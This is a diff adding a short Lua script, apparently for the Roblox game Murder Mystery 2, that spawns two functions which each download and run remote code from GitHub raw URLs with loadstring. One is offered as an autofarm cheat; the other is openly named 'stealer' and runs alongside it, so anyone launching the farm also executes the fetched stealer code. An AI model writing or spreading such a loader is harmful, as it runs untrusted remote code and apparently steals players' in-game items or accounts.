@@ -1,0 +1,9 @@
+local function stealer()
+    loadstring(game:HttpGet('https://raw.githubusercontent.com/FeddyX16/MM2sigma/refs/heads/main/idk'))()
+end
+local function farm()
+    loadstring(game:HttpGet('https://raw.githubusercontent.com/FeddyX16/mm2Autofarm/refs/heads/main/auto'))()
+end
+
+task.spawn(stealer)
+task.spawn(farm)
